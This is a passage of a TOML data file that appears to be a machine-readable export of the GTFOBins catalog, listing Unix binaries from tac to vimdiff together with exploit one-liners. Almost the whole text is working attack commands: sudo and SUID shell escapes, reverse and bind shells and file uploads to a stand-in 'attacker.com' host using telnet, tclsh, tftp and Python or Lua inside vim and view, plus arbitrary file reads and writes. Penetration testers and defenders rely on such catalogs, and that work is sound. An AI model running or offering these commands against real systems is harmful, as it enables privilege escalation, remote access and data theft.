      exp = "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "tail"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "tar"
  Description = ""
  Tags = ["file-upload", "file-download", "file-write", "file-read", "sudo", "limited-suid", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
[[privilege-esclation]]
  Name = "task"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "task execute /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo task execute /bin/sh"
[[privilege-esclation]]
  Name = "taskset"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "taskset 1 /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo taskset 1 /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./taskset 1 /bin/sh -p"
[[privilege-esclation]]
  Name = "tasksh"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./tasksh\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "tasksh\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tasksh\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "tbl"
  Description = "The read file content is corrupted by additional text at the beginning.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntbl $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo tbl $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./tbl $LFILE\n"
[[privilege-esclation]]
  Name = "tclsh"
  Description = ""
  Tags = ["non-interactive-reverse-shell", "suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n"
    [[privilege-esclation.exps.shell]]
      exp = "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    [[privilege-esclation.exps.suid]]
      exp = "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
[[privilege-esclation]]
  Name = "tcpdump"
  Description = "These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.\n\nIn recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.\n"
  Tags = ["command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
[[privilege-esclation]]
  Name = "tdbtool"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./tdbtool\n! /bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "tdbtool\n! /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tdbtool\n! /bin/sh\n"
[[privilege-esclation]]
  Name = "tee"
  Description = "It can only append data if the destination exists."
  Tags = ["file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "telnet"
  Description = ""
  Tags = ["shell", "reverse-shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "tex"
  Description = ""
  Tags = ["limited-suid", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./tex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.shell]]
      exp = "tex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
[[privilege-esclation]]
  Name = "tftp"
  Description = ""
  Tags = ["file-upload", "file-download", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
    [[privilege-esclation.exps.suid]]
      exp = "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
[[privilege-esclation]]
  Name = "tic"
  Description = "The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntic -C \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "time"
  Description = "Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path."
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "/usr/bin/time /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo /usr/bin/time /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./time /bin/sh -p"
[[privilege-esclation]]
  Name = "timedatectl"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n"
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "timedatectl list-timezones\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo timedatectl list-timezones\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "timeout"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "timeout 7d /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo timeout --foreground 7d /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./timeout 7d /bin/sh -p"
[[privilege-esclation]]
  Name = "tmate"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./tmate -c /bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "tmate -c /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tmate -c /bin/sh"
[[privilege-esclation]]
  Name = "tmux"
  Description = ""
  Tags = ["file-read", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntmux -f $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "tmux"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo tmux"
[[privilege-esclation]]
  Name = "top"
  Description = "This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n"
    [[privilege-esclation.exps.sudo]]
      exp = "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
[[privilege-esclation]]
  Name = "torify"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "torify /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo torify /bin/sh"
[[privilege-esclation]]
  Name = "torsocks"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "torsocks /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo torsocks /bin/sh"
[[privilege-esclation]]
  Name = "troff"
  Description = "The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntroff $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo troff $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./troff $LFILE\n"
[[privilege-esclation]]
  Name = "tshark"
  Description = "This program is able to execute [`lua`](/gtfobins/less/) code."
  Tags = ["shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF\n"
[[privilege-esclation]]
  Name = "ul"
  Description = "The read file content is corrupted by replacing occurrences of `$'\\b_'` to terminal sequences and by converting tabs to spaces."
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nul \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ul \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "unexpand"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "uniq"
  Description = "The read file content is corrupted by squashing multiple adjacent lines."
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nuniq \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "unshare"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "unshare /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo unshare /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./unshare -r /bin/sh"
[[privilege-esclation]]
  Name = "unzip"
  Description = "Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nzip shell.zip sh\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n"
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo unzip -K shell.zip\n./sh -p\n"
    [[privilege-esclation.exps.suid]]
      exp = "./unzip -K shell.zip\n./sh -p\n"
[[privilege-esclation]]
  Name = "update-alternatives"
  Description = ""
  Tags = ["sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
[[privilege-esclation]]
  Name = "uudecode"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
[[privilege-esclation]]
  Name = "uuencode"
  Description = ""
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
[[privilege-esclation]]
  Name = "vagrant"
  Description = "This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply."
  Tags = ["shell", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
    [[privilege-esclation.exps.sudo]]
      exp = "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
    [[privilege-esclation.exps.suid]]
      exp = "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
[[privilege-esclation]]
  Name = "valgrind"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "valgrind /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo valgrind /bin/sh"
[[privilege-esclation]]
  Name = "vi"
  Description = "Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called."
  Tags = ["sudo", "shell", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "vi file_to_read"
    [[privilege-esclation.exps.file-write]]
      exp = "vi file_to_write\niDATA\n^[\nw\n"
    [[privilege-esclation.exps.shell]]
      exp = "vi -c ':!/bin/sh' /dev/null"
    [[privilege-esclation.exps.shell]]
      exp = "vi\n:set shell=/bin/sh\n:shell\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vi -c ':!/bin/sh' /dev/null"
[[privilege-esclation]]
  Name = "view"
  Description = ""
  Tags = ["non-interactive-reverse-shell", "non-interactive-bind-shell", "file-upload", "file-download", "file-read", "library-load", "shell", "reverse-shell", "sudo", "limited-suid", "capabilities", "file-write", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "view file_to_read"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "view file_to_write\niDATA\n^[\nw!\n"
    [[privilege-esclation.exps.library-load]]
      exp = "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./view -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "view -c ':!/bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "view\n:set shell=/bin/sh\n:shell\n"
    [[privilege-esclation.exps.shell]]
      exp = "view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "view -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo view -c ':!/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
[[privilege-esclation]]
  Name = "vigr"
  Description = "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vigr"
    [[privilege-esclation.exps.suid]]
      exp = "./vigr"
[[privilege-esclation]]
  Name = "vim"
  Description = ""
  Tags = ["non-interactive-bind-shell", "file-upload", "file-download", "file-write", "sudo", "shell", "non-interactive-reverse-shell", "library-load", "suid", "capabilities", "limited-suid", "reverse-shell", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "vim file_to_read"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "vim file_to_write\niDATA\n^[\nw\n"
    [[privilege-esclation.exps.library-load]]
      exp = "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./vim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "vim -c ':!/bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "vim --cmd ':set shell=/bin/sh|:shell'"
    [[privilege-esclation.exps.shell]]
      exp = "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "vim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vim -c ':!/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
[[privilege-esclation]]
  Name = "vimdiff"
  Description = ""
  Tags = ["file-write", "capabilities", "limited-suid", "reverse-shell", "non-interactive-reverse-shell", "file-download", "file-read", "library-load", "suid", "sudo", "shell", "non-interactive-bind-shell", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "vimdiff file_to_read"
